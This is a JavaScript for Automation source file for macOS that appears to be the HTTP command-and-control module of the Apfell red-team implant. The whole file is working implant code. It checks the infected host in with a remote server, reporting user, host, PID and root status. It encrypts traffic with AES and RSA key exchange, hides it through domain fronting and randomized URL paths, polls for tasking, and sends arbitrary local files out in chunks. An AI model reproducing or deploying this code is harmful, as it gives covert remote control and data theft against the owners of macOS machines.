//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{

	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.get_file_path = "GETFILE";
        this.get_next_task = "GETNEXTTASK";
        this.post_new_callback = "NEWCALLBACK";
        this.post_response = "POSTRESPONSE";
        this.post_new_callback_aespsk = "AES_PSK_NEW_CALLBACK";
        this.post_new_callback_eke_aespsk = "EKE_NEW_CALLBACK";
        this.id_field = "IDSTRING";
        this.host_header = "domain_front";
        this.aes_psk = "AESPSK"; // base64 encoded key
		if(this.aes_psk != ""){
		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
		}
        this.using_key_exchange = "encrypted_exchange_check" == "T";
        if(this.using_key_exchange){
            //lets us know if we can decrypt right away or not
            this.exchanging_keys = true;
        }else{
            this.exchanging_keys = false;
        }
	}
	encrypt_message(data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
	    //create the encrypt transform variable
	    var encrypt = $.SecEncryptTransformCreate(this.cryptokey, Ref());
	    $.SecTransformSetAttribute(encrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
	    $.SecTransformSetAttribute(encrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
        //generate a random IV to use
	    var IV = $.NSMutableData.dataWithLength(16);
	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
	    //var IVref = $.CFDataCreate($(), IV, 16);
	    $.SecTransformSetAttribute(encrypt, $.kSecIVKey, IV, Ref());
	    // set our data to be encrypted
	    var cfdata = $.CFDataCreate($.kCFAllocatorDefault, data, data.length);
        $.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, cfdata, Ref());
        var encryptedData = $.SecTransformExecute(encrypt, Ref());
        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
        var final_message = IV;
        final_message.appendData(encryptedData);
        return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(data){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
        var nsdata = $.NSData.alloc.initWithBase64Encoding(data);
        var decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
        $.SecTransformSetAttribute(decrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
	    $.SecTransformSetAttribute(decrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
	    //console.log("making ranges");
        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
        var iv_range = $.NSMakeRange(0, 16);
        var message_range = $.NSMakeRange(16, nsdata.length - 16);
        //console.log("carving out iv");
        var iv = nsdata.subdataWithRange(iv_range);
        //console.log("setting iv");
        $.SecTransformSetAttribute(decrypt, $.kSecIVKey, iv, Ref());
        //console.log("carving out rest of message");
        var message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $.kSecTransformInputAttributeName, message, Ref());
        //console.log("decrypting");
        var decryptedData = $.SecTransformExecute(decrypt, Ref());
        //console.log("making a string from the message");
        var decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
        //console.log(decrypted_message.js);
        return decrypted_message;
	}
	negotiate_key(){
        // Generate a public/private key pair
        var parameters = $({"type": $.kSecAttrKeyTypeRSA, "bsiz": $(4096), "perm": false});
        var privatekey = $.SecKeyCreateRandomKey(parameters, Ref());
        var publickey = $.SecKeyCopyPublicKey(privatekey);
        var exported_public = $.SecKeyCopyExternalRepresentation(publickey, Ref());
        exported_public = exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
        var s = "abcdefghijklmnopqrstuvwxyz";
	    var session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    var initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
	    //console.log("sending: " + initial_message);
	    // Encrypt our initial message with sessionID and Public key with the initial AES key
	    while(true){
	        try{
                var base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
                //var base64_pub_encrypted = this.htmlPostData("api/v1.1/crypto/EKE/" + apfell.uuid, initial_message);
                var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
                // Decrypt the response with our private key
                var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
                decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
                //console.log("got back: " + decrypted_message.js);
                var json_response = JSON.parse(decrypted_message.js);
                // Adjust our global key information with the newly adjusted session key
                this.aes_psk = json_response['SESSIONKEY']; // base64 encoded key
                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                this.exchanging_keys = false;
                return session_key;
            }catch(error){
                $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
            }
        }
	}
	getRandomMixed(size){
	    return [...Array(size)].map(i=>(~~(Math.random()*36)).toString(36)).join('');
	}
	getRandomNumber(size){
	    return [...Array(size)].map(i=>(~~(Math.random()*10)).toString(10)).join('');
	}
	getRandomAlpha(size){
	    var s = "abcdefghijklmnopqrstuvwxyz";
	    return Array(size).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	}
	getGetFilePath(id, cid){
	    var temp = this.get_file_path.replace(this.id_field, id);
	    temp = temp.replace(this.id_field, cid);
	    return this.stringReplaceRandomizations(temp);
	}
	getNextTaskPath(id){
	    var temp = this.get_next_task.replace(this.id_field, id);
	    return this.stringReplaceRandomizations(temp);
	}
	getPostResponsePath(id){
	    var temp = this.post_response.replace(this.id_field, id);
	    return this.stringReplaceRandomizations(temp);
	}
	getPostNewCallbackPath(){
	    var temp = this.post_new_callback;
	    return this.stringReplaceRandomizations(temp);
	}
	getPostNewCallbackAES_PSK_Path(){
        var temp = this.post_new_callback_aespsk.replace(this.id_field, apfell.uuid);
        return this.stringReplaceRandomizations(temp);
	}
	getPostNewCallbackEKE_AES_PSK_Path(ending){
	    //the replacement field will first be the uuid and then the sessionID
        var temp = this.post_new_callback_eke_aespsk.replace(this.id_field, ending);
        return this.stringReplaceRandomizations(temp);
	}
    stringReplaceRandomizations(string){
        //console.log("called string randomize with: " + string);
        //will get a string like: /admin.php?q=5&page=(N4)&query=(M20)
        var pieces = string.split("("); //[/admin.php?q=5&page=, N4)&query=, M20)]
        var final_string = pieces[0];
        for(var i = 1; i < pieces.length; i++){
            var arg_split = pieces[i].split(")"); //[N4, &query=] and [M20,'']
            //console.log("arg_split: " + arg_split.toString());
            var config = arg_split[0]; //N4 and M20
            var type = config[0]; //N and M
            var size = parseInt(config.slice(1,)); //4 and 20
            if(type == "N"){
                //console.log("calling getRandomNumber with size: " + size);
                final_string += this.getRandomNumber(size);
            }
            else if(type == "M"){
                final_string += this.getRandomMixed(size);
            }
            else if(type == "A"){
                //console.log("calling getRandomAlpha with size: " + size);
                final_string += this.getRandomAlpha(size);
            }
            final_string += arg_split[1];
        }
        return final_string;
    }
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(","),
		"GETFILE":this.get_file_path, "GETNEXTTASK":this.get_next_task, "NEWCALLBACK":this.post_new_callback,
		"POSTRESPONSE":this.post_response}, null, 2);
	}
	setConfig(params){
		//A RESTful base config has 3 updatable components
		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
		if(params['commands'] != undefined){
		    this.commands = params['commands'];
		}
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
		if(user == 'root'){info['integrity_level'] = 3;}
		//calls htmlPostData(url,data) to actually checkin
		//var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
		//Encrypt our data
		//gets back a unique ID
        if(this.exchanging_keys){
            var sessionID = this.negotiate_key();
            var jsondata = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(sessionID), JSON.stringify(info));
            //var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
        }else if(this.aes_psk != ""){
            var jsondata = this.htmlPostData(this.getPostNewCallbackAES_PSK_Path(), JSON.stringify(info));
            //var jsondata = this.htmlPostData("api/v1.1/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
        }else{
            var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
            //var jsondata = this.htmlPostData("api/v1.1/callbacks/", JSON.stringify(info));
        }
        apfell.id = jsondata.id;

        // if we fail to get an ID number then exit the application
        if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }

        return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		while(true){
		    try{
		        var url = this.baseurl + this.getNextTaskPath(apfell.id);
		        //var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		        var task = this.htmlGetData(url);
		        return JSON.parse(task);
		    }
		    catch(error){
		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
		    }
		}

	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse(this.getPostResponsePath(task.id), output);
	    //return this.postRESTResponse("api/v1.0/responses/" + task.id, output);
	}
	postRESTResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		var size= 512000;
		var offset = 0;
		//console.log("total response size: " + data.length);
		do{
		    var csize = data.length - offset > size ? size : data.length - offset;
		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
		    offset += csize;
		    var postData = {"response": encodedChunk};
		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
		}while(offset < data.length);

		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
	     var url = this.baseurl + urlEnding;
        //console.log(url);
        //encrypt our information before sending it
        if(this.aes_psk != ""){
            var data = this.encrypt_message(sendData);
        }else{
            var data = $.NSString.alloc.initWithUTF8String(sendData);
        }
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				if( this.host_header.length > 0){
				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
				}
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
				var deepresp = ObjC.deepUnwrap(resp);
				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    //console.log(deepresp);
                    continue;
                }

				//console.log("response: " + resp.js);
				if(!this.exchanging_keys){
				    //we're not doing the initial key exchange
				    if(this.aes_psk != ""){
				        //if we do need to decrypt the response though, do that
				        resp = ObjC.unwrap(this.decrypt_message(resp));
                        var jsondata = JSON.parse(resp);
                        return jsondata;
				    }else{
                        //we don't need to decrypt it, so we can just parse and return it
                        return JSON.parse(resp.js);
				    }

				}
				else{
				    //if we are currently exchanging keys, just return the response so we can decrypt it differently
                    return resp;
				}
			}
			catch(error){
			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(url){
	    while(true){
	        try{
	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                if( this.host_header.length > 0){
                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                }
                var response = Ref();
                var error = Ref();
                var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                var data =$.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
                var deepresp = ObjC.deepUnwrap(data);
				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    //console.log(deepresp);
                    continue;
                }

                if(this.aes_psk != ""){
                    var decrypted_message = this.decrypt_message(data);
                }else{
                    var decrypted_message = data;
                }
                //console.log(decrypted_message.js);
                return decrypted_message.js;
	        }
	        catch(error){
	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        if( does_file_exist(params)){
            var offset = 0;
            var url = this.getPostResponsePath(task.id);
            var chunkSize = 512000; //3500;
            try{
                if(params[0] != "/"){
                    var fileManager = $.NSFileManager.defaultManager;
                    var cwd = fileManager.currentDirectoryPath.js;
                    params = cwd + "/" + params;
                }
                var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
                // Get the file size by seeking;
                var fileSize = handle.seekToEndOfFile;
            }catch(error){
                output = JSON.stringify({'status': 'error', 'error': error.toString()})
            }
            // always round up to account for chunks that are < chunksize;
            var numOfChunks = Math.ceil(fileSize / chunkSize);
            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id, "full_path": params});
            var registerData = convert_to_nsdata(registerData);
            var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
            //var registerFile = this.postResponse(task, registerData);
            if (registerFile['status'] == "success"){
                handle.seekToFileOffset(0);
                var currentChunk = 1;
                var data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                    fileData = convert_to_nsdata(fileData);
                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}));
                    //this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.interval);

                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                var output = JSON.stringify({"status":"finished", "file_id": registerFile['file_id']})
            }
            else{
               var output = JSON.stringify({'status': 'error', 'error': "Failed to register file to download"});
            }
        }
        else{
            var output = JSON.stringify({'status': 'error', 'error': "file does not exist"});
        }
        return output;
	}
	upload(task, params){
	    try{
	        var url = this.getGetFilePath(params, apfell.id);
	        //var url = "api/v1.0/files/" + params;
            var file_data = this.htmlGetData(this.baseurl + url);
            if(file_data === undefined){
                throw "Got nothing from the Apfell server";
            }
            var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
            //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
            return decoded_data;
            //var output = write_data_to_file(decoded_data, file_path);
            //return output;
	    }catch(error){
	        return error.toString();
	    }

	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
C2 = new customC2(callback_interval, "callback_host:callback_port");
